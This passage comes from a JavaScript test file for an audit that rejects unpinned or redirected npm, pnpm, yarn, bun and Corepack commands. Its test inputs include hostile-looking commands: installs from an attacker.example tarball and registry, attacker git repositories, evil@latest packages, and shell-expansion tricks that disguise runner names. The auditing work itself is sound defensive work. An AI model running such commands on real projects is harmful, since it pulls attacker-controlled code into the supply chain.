    ['np{x..x} mutable-tool@latest', /shell expansion: np\{x\.\.x\}$/m],
    ['np{m,x} mutable-tool@latest', /shell expansion: np\{m,x\}$/m],
    // Quotes are stripped before the name is read, so the quoted spelling is
    // reported like the unquoted one that really expands.
    ['"np{x..x}" mutable-tool@latest', /shell expansion: np\{x\.\.x\}$/m],
    ['./tools/np{x..x} mutable-tool@latest', /shell expansion: \.\/tools\/np\{x\.\.x\}$/m],
    ['np{x..x}@1.2.3 mutable-tool@latest', /shell expansion: np\{x\.\.x\}@1\.2\.3$/m],
    ['npm {x,} mutable-tool@latest', /exact version: npm \{x,\}$/m],
    ['npm exe{c,} mutable-tool@latest', /exact version: npm exe\{c,\}$/m],
    ['npm --silent {x,} mutable-tool@latest', /exact version: npm \{x,\}$/m],
    ['pnpm dl{x,} mutable-tool@latest', /exact version: pnpm dl\{x,\}$/m],
    ['yarn dl{x,} mutable-tool@latest', /exact version: yarn dl\{x,\}$/m],
    ['bun {x,} mutable-tool@latest', /exact version: bun \{x,\}$/m],
    ['npm {a,{b,c}} mutable-tool@latest', /exact version: npm \{a,\{b,c\}\}$/m],
    // A parameter expansion inside a group does not stop the group expanding.
    ['npm {x,${Y}} mutable-tool@latest', /exact version: npm \{x,\$\{Y\}\}$/m],
  ]
  for (const [command, expected] of rejected) {
    const audit = auditExecutableDependencyCommands([{ file: 'package.json', commands: [command] }])
    assert.match(audit.errors.join('\n'), expected, command)
  }

  assert.deepEqual(
    auditExecutableDependencyCommands([
      {
        file: 'package.json',
        commands: [
          // A group needs a comma or a range to expand, so the group keywords
          // of a command list and a literal `{}` placeholder stay literal.
          '{ npx tool@1.0.0; }',
          'npx tool@1.0.0 {}',
          'find . -name "*.log" -exec rm {} +',
          'pnpm --filter "{apps/extension}" build',
          // The expansion is confined to a leading directory, so the literal
          // basename is still audited as a path-qualified runner.
          './tools/{a,b}/npx tool@1.0.0',
          // A recognized command word ends the scan, so a group in the
          // arguments of a script is not a synthesized command word.
          'npm run build -- --shard={1,2}',
          'pnpm exec node -e "console.log({a: 1, b: 2})"',
          // A `${...}` is a parameter expansion, not a group: a case-modifying
          // `${X,Y}` and the `${...args}` a JavaScript spread is rendered as
          // are dynamic words, and the other audits judge those.
          'pnpm ${...commandArgs}',
          'echo ${GREETING,,}',
        ],
      },
    ]),
    { commandCount: 9, errors: [] }
  )
})

test('executable dependency command audit rejects shell expansion inside nested shell bodies', () => {
  // A segment only ever exposes the command word outside a substitution
  // (`echo` here), so the executable inside each body is examined in turn.
  const rejected = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'echo "$(np${X}x mutable-tool@latest)"',
        'echo `$X mutable-tool@latest`',
        'diff <($X mutable-tool@latest) <(cat)',
        'echo "$(a $(np${X}x mutable-tool@latest))"',
        'total=$((1 + $($X mutable-tool@latest)))',
        'bash -c \'echo "$($X mutable-tool@latest)"\'',
        "eval echo '$($X mutable-tool@latest)'",
        'echo "$($X mutable-tool@latest',
      ],
    },
    {
      file: '.github/workflows/expansion.yml',
      commands: ['steps:\n  - run: |\n      X=\n      echo "$(np${X}x mutable-tool@latest)"\n'],
    },
  ])
  assert.equal(rejected.commandCount, 9)
  assert.deepEqual(rejected.errors, [
    'package.json: executable command name uses shell expansion: np${X}x',
    'package.json: executable command name uses shell expansion: $X',
    'package.json: executable command name uses shell expansion: $X',
    'package.json: executable command name uses shell expansion: np${X}x',
    'package.json: executable command name uses shell expansion: $X',
    'package.json: executable command name uses shell expansion: $X',
    'package.json: executable command name uses shell expansion: $X',
    'package.json: executable command name uses shell expansion: $X',
    '.github/workflows/expansion.yml: executable command name uses shell expansion: np${X}x',
  ])

  const accepted = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'echo "$(node tool.js "$ARG")"',
        'repo_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"',
        'owner="$(echo "${GITHUB_REPOSITORY_OWNER}" | tr \'[:upper:]\' \'[:lower:]\')"',
        'total=$((1 + $(node -p 1))) && sleep "$((total * 2))"',
        "echo '$($X mutable-tool@latest)'",
        'echo "\\$($X mutable-tool@latest)"',
        'echo "<($X mutable-tool@latest)"',
        "node <<'NODE'\nconsole.log(`${process.env.X}`)\nNODE\necho done",
      ],
    },
  ])
  assert.deepEqual(accepted, { commandCount: 8, errors: [] })
})

test('executable dependency command audit normalizes a delimiter before the command word', () => {
  const rejected = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'npm -- exec mutable-tool@latest',
        'npm -- x mutable-tool',
        'npm --silent -- exec mutable-tool@latest',
        'npm -- exec -- mutable-tool@latest',
        'npm -- init starter@latest',
        'npm -- install -g mutable-tool@latest',
        'pnpm -- dlx mutable-tool',
        'pnpm --silent -- create starter@latest',
        'pnpm -- add mutable-tool@latest',
        'yarn -- dlx mutable-tool',
        'yarnpkg -- create starter',
        'bun -- x mutable-tool',
        'bun -- add mutable-tool@latest',
      ],
    },
  ])
  assert.equal(rejected.commandCount, 13)
  assert.equal(rejected.errors.length, 13)
  assert.match(rejected.errors.join('\n'), /mutable-tool@latest/)
  assert.match(rejected.errors.join('\n'), /mutable-tool$/m)
  assert.match(rejected.errors.join('\n'), /create-starter@latest/)
  assert.match(rejected.errors.join('\n'), /create-starter$/m)

  const accepted = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'npm -- exec tool@1.2.3',
        'npm -- x -- tool@1.2.3',
        'npm exec -- tool@1.2.3',
        'npm run -- build',
        'npm run build -- --watch',
        'pnpm -- dlx tool@1.2.3',
        'pnpm run -- build --watch',
        'yarn -- dlx tool@1.2.3',
        'bun -- x tool@1.2.3',
      ],
    },
  ])
  assert.deepEqual(accepted, { commandCount: 9, errors: [] })
})

test('executable dependency command audit covers package-fetching install and add forms', () => {
  const rejected = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'npm install -g mutable-tool@latest',
        'npm i mutable-tool',
        'npm isntall -D @scope/tool@^1.2.3',
        'npm add --save-exact mutable-tool@next',
        'npm install -- mutable-tool@latest',
        'npm link mutable-tool',
        'npm install-test mutable-tool@1',
        'npm install https://attacker.example/tool-1.2.3.tgz',
        'npm install github:attacker/tool',
        'npm --silent install mutable-tool',
        'pnpm add -g mutable-tool@latest',
        'pnpm install mutable-tool',
        'pnpm -w i mutable-tool@latest',
        'pnpm --filter app add mutable-tool',
        'corepack pnpm add -D mutable-tool@^1.2.3',
        'yarn add mutable-tool@latest',
        'yarn global add mutable-tool',
        'yarnpkg add -D @scope/tool@next',
        'bun add mutable-tool',
        'bun install -g mutable-tool@latest',
        'bun i mutable-tool',
        'npm install --registry=https://attacker.example tool@1.2.3',
        'pnpm add --registry https://attacker.example tool@1.2.3',
      ],
    },
    {
      file: '.github/workflows/tooling.yml',
      commands: ['steps:\n  - run: npm install -g mutable-tool@latest'],
    },
  ])
  assert.equal(rejected.commandCount, 24)
  assert.equal(rejected.errors.length, 24)
  assert.match(rejected.errors.join('\n'), /mutable-tool@latest/)
  assert.match(rejected.errors.join('\n'), /@scope\/tool@\^1\.2\.3/)
  assert.match(rejected.errors.join('\n'), /@scope\/tool@next/)
  assert.match(rejected.errors.join('\n'), /https:\/\/attacker\.example\/tool-1\.2\.3\.tgz/)
  assert.match(rejected.errors.join('\n'), /github:attacker\/tool/)
  assert.match(rejected.errors.join('\n'), /--registry=https:\/\/attacker\.example/)
  assert.match(rejected.errors.join('\n'), /: --registry$/m)
  assert.doesNotMatch(rejected.errors.join('\n'), /tool@1\.2\.3$/m)

  const accepted = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'npm ci',
        'npm install -g tool@1.2.3',
        'npm i -D @scope/tool@1.2.3 other@2.0.0',
        'npm install -w packages/app tool@1.2.3',
        'npm install --loglevel silent tool@1.2.3',
        'npm run install-browsers -- chromium',
        'npm exec -- tool@1.2.3 install chromium',
        'pnpm install --frozen-lockfile',
        'pnpm install --lockfile-only',
        'pnpm add -D tool@1.2.3',
        'pnpm --filter app add @scope/tool@1.2.3',
        'pnpm -r --if-present --filter ./packages/** run build',
        'pnpm exec playwright install --with-deps chromium',
        'corepack pnpm exec browsers install chrome@148.0.7778.97 --path .context/browsers',
        'yarn add tool@1.2.3',
        'yarn global add @scope/tool@1.2.3',
        'yarn run install-browsers chromium',
        'bun add tool@1.2.3',
        'bun run install-browsers chromium',
      ],
    },
  ])
  assert.deepEqual(accepted, { commandCount: 19, errors: [] })
})

test('executable dependency command audit covers operand-less install forms', () => {
  const rejected = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'npm install',
        'npm i',
        'npm install --loglevel silent',
        'npm --silent install',
        'npm -- install',
        'npm install --',
        'npm install --prefix dir',
        'npm link',
        'yarn install',
        'yarn',
        'yarn --frozen-lockfile',
        'yarn --immutable',
        // A value option's argument is not a script name, so this is still bare.
        'yarn --mutex network',
        'yarnpkg install',
        'yarn global add',
        'bun install',
        'bun i',
      ],
    },
    {
      file: '.github/workflows/tooling.yml',
      commands: ['steps:\n  - run: npm install'],
    },
  ])
  assert.equal(rejected.commandCount, 18)
  // `npm install --prefix dir` is reported twice: once for the resolution
  // override and once for the operand-less install it still is.
  assert.equal(rejected.errors.length, 19)
  // A bare install by a manager that honours no lockfile here re-resolves every
  // declared range, so it fails closed on the command word instead of passing
  // with an empty operand list.
  assert.match(rejected.errors.join('\n'), /: npm install$/m)
  assert.match(rejected.errors.join('\n'), /: npm i$/m)
  assert.match(rejected.errors.join('\n'), /: npm link$/m)
  assert.match(rejected.errors.join('\n'), /: yarn install$/m)
  assert.match(rejected.errors.join('\n'), /: yarn add$/m)
  assert.match(rejected.errors.join('\n'), /: bun install$/m)
  assert.match(rejected.errors.join('\n'), /: bun i$/m)
  assert.match(rejected.errors.join('\n'), /^\.github\/workflows\/tooling\.yml: .*: npm install$/m)

  // Options never become operands, so an option-only install reports the
  // canonical command word and nothing else.
  const optionOnly = auditExecutableDependencyCommands([
    { file: 'package.json', commands: ['npm install --loglevel silent'] },
  ])
  assert.deepEqual(optionOnly, {
    commandCount: 1,
    errors: ['package.json: executable package is not pinned to an exact version: npm install'],
  })

  // An exact operand behind a value option keeps the install out of the bare
  // form; `--prefix` remains rejected on its own as a resolution override.
  const prefixed = auditExecutableDependencyCommands([
    { file: 'package.json', commands: ['npm install --prefix dir foo@1.0.0'] },
  ])
  assert.deepEqual(prefixed, {
    commandCount: 1,
    errors: ['package.json: executable package is not pinned to an exact version: --prefix'],
  })

  const accepted = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'pnpm install',
        'pnpm install --frozen-lockfile',
        'pnpm i',
        'corepack pnpm install --frozen-lockfile',
        'npm ci',
        'npm clean-install',
        'npm install lodash@4.17.21',
        'npm i -g corepack@0.24.1',
        'yarn add left-pad@1.3.0',
        'yarn run build',
        'yarn build',
        'yarn dlx tool@1.2.3',
        'yarn --otp 123456 add left-pad@1.3.0',
        'bun add foo@1.2.3',
      ],
    },
  ])
  assert.deepEqual(accepted, { commandCount: 14, errors: [] })
})

test('executable dependency command audit covers package-refreshing update forms', () => {
  const rejected = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'npm update mutable-tool',
        'npm up mutable-tool',
        'npm upgrade mutable-tool',
        'npm udpate mutable-tool',
        'npm u mutable-tool',
        'npm update mutable-tool@latest',
        'npm update @scope/tool@^1.2.3',
        'npm update',
        'npm update -g',
        'npm update --before 2024-01-01',
        'npm --silent update mutable-tool',
        'npm -- update mutable-tool',
        'npm update -- mutable-tool',
        'npm update --registry=https://attacker.example tool@1.2.3',
        'pnpm up',
        'pnpm update mutable-tool',
        'pnpm upgrade -g mutable-tool@next',
        'pnpm --filter app up mutable-tool',
        'pnpm update --unknown-option',
        'corepack pnpm update --latest',
        'yarn up mutable-tool',
        'yarn upgrade mutable-tool@latest',
        'yarn upgrade',
        'yarn upgrade-interactive',
        'yarn global upgrade mutable-tool',
        'yarnpkg up @scope/tool@next',
        'bun update mutable-tool',
        'bun update',
      ],
    },
    {
      file: '.github/workflows/tooling.yml',
      commands: ['steps:\n  - run: npm update --save'],
    },
  ])
  assert.equal(rejected.commandCount, 29)
  assert.equal(rejected.errors.length, 29)
  assert.match(rejected.errors.join('\n'), /mutable-tool@latest/)
  assert.match(rejected.errors.join('\n'), /@scope\/tool@\^1\.2\.3/)
  assert.match(rejected.errors.join('\n'), /@scope\/tool@next/)
  assert.match(rejected.errors.join('\n'), /--registry=https:\/\/attacker\.example/)
  // A bare update refreshes every dependency, so it fails closed on the
  // command word instead of passing with an empty operand list.
  assert.match(rejected.errors.join('\n'), /: npm update$/m)
  assert.match(rejected.errors.join('\n'), /: pnpm up$/m)
  assert.match(rejected.errors.join('\n'), /: pnpm update$/m)
  assert.match(rejected.errors.join('\n'), /: yarn upgrade$/m)
  assert.match(rejected.errors.join('\n'), /: yarn upgrade-interactive$/m)
  assert.match(rejected.errors.join('\n'), /: bun update$/m)
  assert.match(
    rejected.errors.join('\n'),
    /^\.github\/workflows\/tooling\.yml: .*: npm update$/m
  )
  assert.doesNotMatch(rejected.errors.join('\n'), /tool@1\.2\.3$/m)

  const accepted = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'npm update tool@1.2.3',
        'npm up @scope/tool@1.2.3 other@2.0.0',
        'npm update -w packages/app tool@1.2.3',
        'npm --loglevel silent update tool@1.2.3',
        'npm update -- tool@1.2.3',
        'npm run update',
        'npm run-script upgrade',
        'npm outdated',
        'pnpm update tool@1.2.3',
        'pnpm --filter app up @scope/tool@1.2.3',
        'pnpm run up',
        'yarn up tool@1.2.3',
        'yarn global upgrade @scope/tool@1.2.3',
        'yarn run upgrade',
        'bun update tool@1.2.3',
        'bun run update',
      ],
    },
  ])
  assert.deepEqual(accepted, { commandCount: 16, errors: [] })
})

test('executable dependency command audit requires exact Corepack package-manager specs', () => {
  const rejected = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'corepack pnpm@latest dlx tool@1.2.3',
        'corepack npm@next exec -- tool@1.2.3',
        'corepack yarn@^4 dlx tool@1.2.3',
        'corepack yarnpkg@berry dlx tool@1.2.3',
        'corepack prepare pnpm@latest --activate',
        'corepack use pnpm@latest',
        'corepack install -g yarn@stable',
        'corepack pnpm@ dlx tool@1.2.3',
        'corepack pnpm@"latest" dlx tool@1.2.3',
        'corepack pnpm@8.6.0 dlx mutable-tool',
        // A quoted spec is still a Corepack runner; it must not hide the
        // package the runner fetches.
        'corepack "pnpm@8.6.0" dlx tool@latest',
        "corepack 'pnpm@8.6.0' dlx tool@latest",
        'corepack "npm@10.8.2" exec -- tool@latest',
      ],
    },
    {
      file: '.github/workflows/toolchain.yml',
      commands: ['steps:\n  - run: corepack prepare pnpm@latest --activate'],
    },
  ])
  assert.equal(rejected.commandCount, 14)
  // `pnpm@"latest"` is reported both as a quoted runner and as an empty spec,
  // and the `yarn@stable` operand also reads as an operand-less Yarn install.
  assert.equal(rejected.errors.length, 16)
  assert.match(rejected.errors.join('\n'), /pnpm@latest/)
  assert.match(rejected.errors.join('\n'), /npm@next/)
  assert.match(rejected.errors.join('\n'), /yarn@\^4/)
  assert.match(rejected.errors.join('\n'), /yarnpkg@berry/)
  assert.match(rejected.errors.join('\n'), /yarn@stable/)
  assert.match(rejected.errors.join('\n'), /pnpm@$/m)
  assert.match(rejected.errors.join('\n'), /mutable-tool/)
  assert.match(rejected.errors.join('\n'), /"pnpm@8\.6\.0"/)
  assert.match(rejected.errors.join('\n'), /'pnpm@8\.6\.0'/)
  assert.match(rejected.errors.join('\n'), /"npm@10\.8\.2"/)
  assert.doesNotMatch(rejected.errors.join('\n'), /tool@1\.2\.3/)

  const accepted = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'corepack pnpm@8.6.0 dlx tool@1.2.3',
        'corepack npm@10.8.2 exec -- tool@1.2.3',
        'corepack yarn@4.1.0 dlx tool@1.2.3',
        'corepack prepare pnpm@8.6.0 --activate',
        'corepack enable',
        'corepack pnpm@8.6.0 install --frozen-lockfile',
      ],
    },
  ])
  assert.deepEqual(accepted, { commandCount: 6, errors: [] })
})

test('executable dependency command audit rejects working-directory and unreviewed npm prefix options', () => {
  const rejected = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'npm --prefix ./attacker exec tool@1.2.3',
        'npm --prefix=./attacker x tool@1.2.3',
        'npm -C ./attacker exec -- tool@1.2.3',
        'npm exec --prefix ./attacker tool@1.2.3',
        'npm exec tool@1.2.3 --prefix=./attacker',
        'npm --prefix ./attacker init starter@1.2.3',
        'npm --global exec tool@1.2.3',
        'npm --location=global x tool@1.2.3',
        'npm --mystery exec tool@1.2.3',
        'npm --mystery=value x -- tool@1.2.3',
        'npm --workspace= exec tool@1.2.3',
        'npm --package exec tool@1.2.3',
        'pnpm --dir ./attacker dlx tool@1.2.3',
        'pnpm -C ./attacker create starter@1.2.3',
        'pnpm dlx --dir=./attacker tool@1.2.3',
        'pnpx -C ./attacker tool@1.2.3',
        'yarn --cwd ./attacker dlx tool@1.2.3',
        'yarn dlx tool@1.2.3 --cwd ./attacker',
        'bun --cwd ./attacker x tool@1.2.3',
        'bunx --cwd=./attacker tool@1.2.3',
      ],
    },
  ])
  assert.equal(rejected.commandCount, 20)
  assert.equal(rejected.errors.length, 20)
  assert.match(rejected.errors.join('\n'), /--prefix ?/)
  assert.match(rejected.errors.join('\n'), /--prefix=\.\/attacker/)
  assert.match(rejected.errors.join('\n'), /: -C$/m)
  assert.match(rejected.errors.join('\n'), /--global/)
  assert.match(rejected.errors.join('\n'), /--location=global/)
  assert.match(rejected.errors.join('\n'), /--mystery$/m)
  assert.match(rejected.errors.join('\n'), /--mystery=value/)
  assert.match(rejected.errors.join('\n'), /--workspace=/)
  assert.match(rejected.errors.join('\n'), /--package$/m)
  assert.match(rejected.errors.join('\n'), /--dir$/m)
  assert.match(rejected.errors.join('\n'), /--dir=\.\/attacker/)
  assert.match(rejected.errors.join('\n'), /--cwd$/m)
  assert.match(rejected.errors.join('\n'), /--cwd=\.\/attacker/)
  assert.doesNotMatch(rejected.errors.join('\n'), /tool@1\.2\.3|starter@1\.2\.3/)

  const accepted = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'npm --silent exec tool@1.2.3',
        'npm -s x -- tool@1.2.3',
        'npm --loglevel silent exec tool@1.2.3',
        'npm --loglevel=silent x tool@1.2.3',
        'npm -w packages/app exec tool@1.2.3',
        'npm --workspace=packages/app x -- tool@1.2.3',
        'npm --yes exec tool@1.2.3',
        'npm --package=@scope/tool@1.2.3 --silent exec tool',
        'npm --silent --package @scope/tool@1.2.3 exec -- tool',
        'npm exec -w packages/app tool@1.2.3',
      ],
    },
  ])
  assert.deepEqual(accepted, { commandCount: 10, errors: [] })
})

test('executable dependency command audit covers path-qualified runner binaries', () => {
  const audit = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        '/usr/local/bin/npm exec mutable-npm',
        './node_modules/.bin/npx mutable-npx',
        '../bin/pnx mutable-pnx',
        'tools/pnpm dlx mutable-pnpm',
        '/opt/bin/yarn dlx mutable-yarn',
        './bin/bun x mutable-bun',
        '/usr/local/bin/npm exec tool@1.2.3',
        './node_modules/.bin/npx tool@1.2.3',
        '../bin/pnx tool@1.2.3',
        'tools/pnpm dlx tool@1.2.3',
        '/opt/bin/yarn dlx tool@1.2.3',
        './bin/bun x tool@1.2.3',
        'echo https://example.test/npx mutable-url',
        'echo @scope/npx mutable-package-name',
        'echo tools/npx-wrapper mutable-wrapper',
        'n\\px mutable-escaped',
        'np""x mutable-quoted',
      ],
    },
  ])
  assert.equal(audit.commandCount, 17)
  assert.equal(audit.errors.length, 8)
  for (const manager of ['npm', 'npx', 'pnx', 'pnpm', 'yarn', 'bun']) {
    assert.match(audit.errors.join('\n'), new RegExp(`mutable-${manager}`))
  }
  assert.match(audit.errors.join('\n'), /n\\px/)
  assert.match(audit.errors.join('\n'), /np""x/)
  assert.doesNotMatch(audit.errors.join('\n'), /mutable-url|mutable-package-name|mutable-wrapper/)
})

test('executable dependency command audit prefers pre-delimiter positional packages', () => {
  const audit = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'npm exec mutable-npm -- pinned-helper@1.2.3',
        'npx mutable-npx -- pinned-helper@1.2.3',
        'pnpm dlx mutable-pnpm -- pinned-helper@1.2.3',
        'yarn dlx mutable-yarn -- pinned-helper@1.2.3',
        'pnpx mutable-pnpx -- pinned-helper@1.2.3',
        'pnx mutable-pnx -- pinned-helper@1.2.3',
        'bunx mutable-bunx -- pinned-helper@1.2.3',
        'npm exec -- pinned-helper@1.2.3',
        'npx -- pinned-helper@1.2.3',
        'pnpm dlx -- pinned-helper@1.2.3',
        'npm exec --package exact-package@1.2.3 mutable-positional -- pinned-helper@1.2.3',
        "npm exec --call 'local-tool --flag' mutable-positional -- pinned-helper@1.2.3",
      ],
    },
  ])
  assert.equal(audit.commandCount, 12)
  assert.equal(audit.errors.length, 7)
  for (const runner of ['npm', 'npx', 'pnpm', 'yarn', 'pnpx', 'pnx', 'bunx']) {
    assert.match(audit.errors.join('\n'), new RegExp(`mutable-${runner}`))
  }
  assert.doesNotMatch(audit.errors.join('\n'), /pinned-helper|mutable-positional/)
})

test('executable dependency command audit covers explicit direct-runner packages', () => {
  const rejected = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'pnpx --package evil@latest -- tool@1.2.3',
        'pnx -p evil@latest tool',
        'pnx --package=safe@1.2.3 --package evil@latest tool',
        'pnpm --package=evil@latest dlx tool@1.2.3',
        'pnpm -p @scope/evil@next dlx tool@1.2.3',
        'pnpm dlx --package evil@latest -- tool@1.2.3',
        'yarn dlx -p evil@latest -- tool@1.2.3',
        'yarnpkg dlx --package=evil@latest tool',
        'bunx -p evil@latest -- tool@1.2.3',
        'bun x --package evil@latest -- tool@1.2.3',
        'npx mutable-npx -p safe@1.2.3',
        'pnpx mutable-pnpx -p safe@1.2.3',
        'pnx mutable-pnx --package safe@1.2.3',
        'pnpm dlx mutable-pnpm -p safe@1.2.3',
        'yarn dlx mutable-yarn --package safe@1.2.3',
        'bunx mutable-bunx --package safe@1.2.3',
      ],
    },
  ])
  assert.equal(rejected.commandCount, 16)
  assert.equal(rejected.errors.length, 16)
  assert.match(rejected.errors.join('\n'), /evil@latest/)
  assert.match(rejected.errors.join('\n'), /@scope\/evil@next/)
  for (const runner of ['npx', 'pnpx', 'pnx', 'pnpm', 'yarn', 'bunx']) {
    assert.match(rejected.errors.join('\n'), new RegExp(`mutable-${runner}`))
  }
  assert.doesNotMatch(rejected.errors.join('\n'), /safe@1\.2\.3/)
  assert.doesNotMatch(rejected.errors.join('\n'), /tool@1\.2\.3/)

  const accepted = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'pnpx --package safe@1.2.3 -- tool',
        'pnx -p @scope/safe@1.2.3 tool',
        'pnx --package=safe@1.2.3 --package @scope/other@2.0.0 tool',
        'pnpm --package=safe@1.2.3 dlx tool',
        'pnpm -p @scope/safe@1.2.3 dlx tool',
        'pnpm dlx --package safe@1.2.3 -- tool',
        'yarn dlx -p safe@1.2.3 -- tool',
        'yarnpkg dlx --package=@scope/safe@1.2.3 tool',
        'yarn dlx -p safe@1.2.3 -p @scope/other@2.0.0 tool',
        'bunx --bun -p safe@1.2.3 -- tool',
        'bun x --silent --package @scope/safe@1.2.3 -- tool',
        'bunx --no-install safe@1.2.3',
      ],
    },
  ])
  assert.deepEqual(accepted, { commandCount: 12, errors: [] })
})

test('executable dependency command audit preserves direct-runner delimiter semantics', () => {
  const rejected = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'pnpx mutable-pnpx -- --help',
        'pnx -- mutable-pnx',
        'pnpm dlx mutable-pnpm -- --help',
        'pnpm dlx -- mutable-pnpm-post',
        'yarn dlx mutable-yarn -- --help',
        'yarnpkg dlx -- mutable-yarnpkg',
        'bunx mutable-bunx -- --help',
        'bunx -- mutable-bunx-post',
        'bun x mutable-bun -- --help',
        'bun x -- mutable-bun-post',
      ],
    },
  ])
  assert.equal(rejected.commandCount, 10)
  assert.equal(rejected.errors.length, 10)
  for (const runner of ['pnpx', 'pnx', 'pnpm', 'yarn', 'yarnpkg', 'bunx', 'bun']) {
    assert.match(rejected.errors.join('\n'), new RegExp(`mutable-${runner}`))
  }

  const accepted = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'pnpx --silent safe@1.2.3 -- --help',
        'pnx -s -- safe@1.2.3',
        'pnx --allow-build=esbuild safe@1.2.3',
        'pnpm dlx safe@1.2.3 -- --help',
        'pnpm dlx -- safe@1.2.3',
        'yarn dlx --quiet safe@1.2.3 -- --help',
        'yarnpkg dlx -q -- safe@1.2.3',
        'bunx --verbose safe@1.2.3 -- --help',
        'bunx --no-install -- safe@1.2.3',
        'bun x --bun safe@1.2.3 -- --help',
        'bun x --silent -- safe@1.2.3',
      ],
    },
  ])
  assert.deepEqual(accepted, { commandCount: 11, errors: [] })
})

test('executable dependency command audit covers pnpm runner aliases', () => {
  const audit = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'pnx mutable-tool verify',
        'pnpx @scope/tool@latest verify',
        'pnx mutable-tool@^1.2.3 verify',
        'pnx tool@1.2.3 verify',
        'pnpx @scope/tool@1.2.3 verify',
      ],
    },
  ])
  assert.equal(audit.commandCount, 5)
  assert.equal(audit.errors.length, 3)
  assert.match(audit.errors.join('\n'), /mutable-tool/)
  assert.match(audit.errors.join('\n'), /@scope\/tool@latest/)
  assert.doesNotMatch(audit.errors.join('\n'), /tool@1\.2\.3/)
})

test('executable dependency command audit validates the complete package identity', () => {
  const audit = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'npx https://attacker.example/tool@1.2.3',
        'pnpm dlx git+ssh://git@github.com/attacker/tool.git@1.2.3',
        'bunx ../tool@1.2.3',
        'npm exec tool@npm:safe@1.2.3',
        'pnx file:../tool@1.2.3',
        'npx tool@1.2.3',
        'npm exec -- @scope/tool@1.2.3',
      ],
    },
  ])
  assert.equal(audit.commandCount, 7)
  assert.equal(audit.errors.length, 5)
  assert.match(audit.errors.join('\n'), /https:\/\/attacker\.example/)
  assert.match(audit.errors.join('\n'), /git\+ssh:/)
  assert.match(audit.errors.join('\n'), /\.\.\/tool@1\.2\.3/)
  assert.match(audit.errors.join('\n'), /tool@npm:safe@1\.2\.3/)
  assert.match(audit.errors.join('\n'), /file:/)
})

test('executable dependency command audit covers npm initializer aliases and legacy forms', () => {
  const rejected = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'npm init starter',
        'npm create starter@latest',
        'npm init create-starter@latest',
        'npm innit @scope/starter@^1.2.3',
        'npm init @scope',
        'npm init @scope@latest',
        'npm init -w packages/app starter@latest',
        'npm create --workspace=packages/app @scope/starter@next',
        'npm init https://attacker.example/starter.tgz@1.2.3',
        'npm create git+https://github.com/attacker/starter.git#v1.2.3',
        'npm innit ../starter@1.2.3',
        'npm init starter@npm:safe@1.2.3',
        'npm init --mystery starter@1.2.3',
      ],
    },
  ])
  assert.equal(rejected.commandCount, 13)
  assert.equal(rejected.errors.length, 13)
  assert.match(rejected.errors.join('\n'), /create-starter@latest/)
  assert.match(rejected.errors.join('\n'), /create-create-starter@latest/)
  assert.match(rejected.errors.join('\n'), /@scope\/create-starter@\^1\.2\.3/)
  assert.match(rejected.errors.join('\n'), /@scope\/create@latest/)
  assert.match(rejected.errors.join('\n'), /https:\/\/attacker\.example/)
  assert.match(rejected.errors.join('\n'), /git\+https:/)
  assert.match(rejected.errors.join('\n'), /starter@npm:safe@1\.2\.3/)
  assert.match(rejected.errors.join('\n'), /--mystery/)

  const accepted = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'npm init',
        'npm init -y',
        'npm create --yes',
        'npm innit -w packages/app',
        'npm init --scope @scope --yes',
        'npm init starter@1.2.3',
        'npm create @scope/starter@1.2.3',
        'npm innit @scope@2.0.0',
        'npm init -w packages/app starter@1.2.3',
        'npm init starter@1.2.3-beta.1+build.5',
        'npm init -- starter@1.2.3',
      ],
    },
  ])
  assert.deepEqual(accepted, { commandCount: 11, errors: [] })
})

test('executable dependency command audit accepts only reviewed npm initializer options', () => {
  const rejected = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'npm init --mystery=value starter@1.2.3',
        'npm init --workspace= starter@1.2.3',
        'npm init --scope= starter@1.2.3',
        'npm init --yes=maybe starter@1.2.3',
        'npm init --workspace --yes starter@1.2.3',
        'npm --mystery=value init starter@1.2.3',
      ],
    },
  ])
  assert.equal(rejected.commandCount, 6)
  assert.equal(rejected.errors.length, 6)
  assert.match(rejected.errors.join('\n'), /--mystery=value/)
  assert.match(rejected.errors.join('\n'), /--workspace=/)
  assert.match(rejected.errors.join('\n'), /--scope=/)
  assert.match(rejected.errors.join('\n'), /--yes=maybe/)

  const accepted = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'npm init --workspace=packages/app starter@1.2.3',
        'npm init --workspace packages/app starter@1.2.3',
        'npm init --scope=@scope --yes',
        'npm init --yes=true',
        'npm init --force=false',
        'npm --silent init starter@1.2.3',
        'npm --loglevel silent init starter@1.2.3',
        'npm init --silent starter@1.2.3',
        'npm init --loglevel=silent starter@1.2.3',
      ],
    },
  ])
  assert.deepEqual(accepted, { commandCount: 9, errors: [] })
})

test('executable dependency command audit rejects runner resolution overrides', () => {
  const rejected = auditExecutableDependencyCommands([
    {
      file: 'package.json',
      commands: [
        'npm init --registry=https://attacker.example starter@1.2.3',
